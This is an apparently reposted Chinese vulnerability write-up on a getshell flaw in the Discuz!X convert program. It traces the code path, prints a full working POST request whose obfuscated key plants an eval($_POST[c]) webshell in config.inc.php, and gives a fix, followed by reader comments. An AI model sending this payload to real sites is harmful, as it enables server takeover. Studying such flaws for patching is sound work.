<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Discuz!X升级/转换程序GETSHELL漏洞分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">360网站安全中心</a> <span class="bull">·</span> <time title="2014/02/14 18:47" ui-time="" datetime="2014/02/14 18:47" class="published ng-binding ng-isolate-scope">2014/02/14 18:47</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x01 漏洞分析</h2><hr><p>漏洞的根源在代码注释中出现换行，导致代码执行，流程如下:</p><h3>0x0101 首先，从 index.php第30行跟入。</h3><p><img alt="enter image description here" img-src="b64e0f65627549cb9f74ed6a25e0de7b7215326c.jpg"></p><h3>0x0102 do&#95;config&#95;inc.php的第37行，跟入这个save&#95;config&#95;file()函数。</h3><p><img alt="enter image description here" img-src="bff5f77c893d7f71058e2baffb8bf460c5e80a6a.jpg"></p><h3>0x0103 gobal.func.php第624行，跟入这个getvars()函数。</h3><p><img alt="enter image description here" img-src="bc39233b90789df22577ad0daf345ff221dd9cb7.jpg"></p><h3>0x0104 继续跟入buildarray()这个函数</h3><p><img alt="enter image description here" img-src="de3225c93798d885e59a44eb6d51990b9da86d58.jpg"></p><h3>0x0105 漏洞出现在598行，这个$newline的问题。</h3><p><img alt="enter image description here" img-src="0d28bd612719335b3b9f4e61457c87f324fade5d.jpg"></p><p>这里因为$key可控，所以$newline可控，当$newline出现 或 时，导致BBB可以作为php代码执行。如图所示。</p><p><img alt="enter image description here" img-src="86b98b90a384fecb71892a6b1fac421b240b2ce4.jpg"></p><h2>0x02 漏洞利用</h2><hr><p>可以构造如下请求：</p><pre><code>POST /DZ2/convert/ HTTP/1.1
Host: 192.168.52.129
Proxy-Connection: keep-alive
Content-Length: 925
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8

a=config&amp;source=d7.2_x2.0&amp;submit=yes&amp;newconfig%5Btarget%5D%5Bdbhost%5D=localhost&amp;newconfig%5Baaa%0D%0A%0D%0Aeval%28CHR%28101%29.CHR%28118%29.CHR%2897%29.CHR%28108%29.CHR%2840%29.CHR%2834%29.CHR%2836%29.CHR%2895%29.CHR%2880%29.CHR%2879%29.CHR%2883%29.CHR%2884%29.CHR%2891%29.CHR%2899%29.CHR%2893%29.CHR%2859%29.CHR%2834%29.CHR%2841%29.CHR%2859%29%29%3B%2F%2F%5D=localhost&amp;newconfig%5Bsource%5D%5Bdbuser%5D=root&amp;newconfig%5Bsource%5D%5Bdbpw%5D=&amp;newconfig%5Bsource%5D%5Bdbname%5D=discuz&amp;newconfig%5Bsource%5D%5Btablepre%5D=cdb_&amp;newconfig%5Bsource%5D%5Bdbcharset%5D=&amp;newconfig%5Bsource%5D%5Bpconnect%5D=1&amp;newconfig%5Btarget%5D%5Bdbhost%5D=localhost&amp;newconfig%5Btarget%5D%5Bdbuser%5D=root&amp;newconfig%5Btarget%5D%5Bdbpw%5D=&amp;newconfig%5Btarget%5D%5Bdbname%5D=discuzx&amp;newconfig%5Btarget%5D%5Btablepre%5D=pre_&amp;newconfig%5Btarget%5D%5Bdbcharset%5D=&amp;newconfig%5Btarget%5D%5Bpconnect%5D=1&amp;submit=%B1%A3%B4%E6%B7%FE%CE%F1%C6%F7%C9%E8%D6%C3
</code></pre><p>发送这段请求直接getshell，恶意代码写入/convert/data/config.inc.php文件当中，如图所示。</p><p><img alt="enter image description here" img-src="9caa2542738a65e5a046e4182b7574019eb351d6.jpg"></p><h2>0x03 关于修复</h2><hr><p>需要在global.func.php文件的buildarray函数中过滤掉$key中的非字母、数字及下划线字符，即添加代码如下：</p><pre><code>#!php
$key = preg_replace("/[^w]/","", $key);
</code></pre><p>如图所示。</p><p><img alt="enter image description here" img-src="9e2f76f6351411e0da174ea7f4596fdc9631428d.jpg"></p><p>（以上分析仅供学习交流，各DZ！X系列站长勿忘修复！）</p><p>以上为360网站安全中心博客文章，原文：<a href="http://loudong.360.cn/blog/view/id/15">http://loudong.360.cn/blog/view/id/15</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">luwikes</span> <span class="reply-time">2014-02-21 10:07:41</span></div><p></p><p>建议把以前的修复方案也保留。<br>比较学习下。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-02-18 10:24:26</span></div><p></p><p>昨天下午作者看到评论，提供更完整的修复方案！~<br>感谢楼上点评 :)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Undoit</span> <span class="reply-time">2014-02-18 10:19:57</span></div><p></p><p>原来的修复方案不是这样的,原来是只过滤换行符.昨天下午修改成现在这样了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">s3cur1ty</span> <span class="reply-time">2014-02-18 09:52:44</span></div><p></p><p>$key = preg_replace("/[^\w]/","", $key);</p><p>这句代码应该可以防住使用 ?&gt; 结束PHP的利用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Undoit</span> <span class="reply-time">2014-02-17 12:20:58</span></div><p></p><p>360的修复不完全啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Undoit</span> <span class="reply-time">2014-02-17 12:15:54</span></div><p></p><p>还有一种利用方式是使用 ?&gt; 结束PHP，再重新写一个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Coner</span> <span class="reply-time">2014-02-17 10:21:17</span></div><p></p><p>嗯，一个回车符，将原本是注释的部分当做PHP代码写入配置文件，另外写入的代码在key而非value，挺好:)<br>作者跟踪代码的时候应该是以变量为线索，可是文中叙述时却以函数为主线，你在卖什么药呢？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Creturn</span> <span class="reply-time">2014-02-15 16:00:23</span></div><p></p><p>xdebug就可以断点单步跟踪</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">360网站卫士</span> <span class="reply-time">2014-02-15 12:24:57</span></div><p></p><p>我来顶顶自己人</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ricter</span> <span class="reply-time">2014-02-14 23:25:25</span></div><p></p><p>代码跟踪确实很爽。<br>vim下的ctrl+]就可以跳转，但是实时跟踪就跪了。。</p><p></p></div></div></div></div></div></main>